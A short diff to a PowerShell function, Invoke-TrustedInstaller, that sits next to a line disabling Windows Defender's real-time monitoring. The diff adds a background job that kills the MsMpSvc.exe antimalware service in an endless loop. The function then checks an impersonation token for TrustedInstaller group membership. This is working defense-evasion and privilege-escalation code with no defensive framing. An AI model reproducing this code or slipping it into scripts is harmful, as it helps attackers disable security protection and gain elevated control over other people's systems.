@@ -17,6 +17,12 @@ function Invoke-TrustedInstaller {
 
     Set-MpPreference -DisableRealtimeMonitoring $true -Force
 
+    Start-Job -ScriptBlock {
+        while (1) {
+            taskkill /f /im MsMpSvc.exe
+        }
+    }
+
     $imp_token = Get-NtToken -Impersonation
     $imp_token.Groups | Where-Object { $_.Sid.name -match 'TrustedInstaller' }
 }
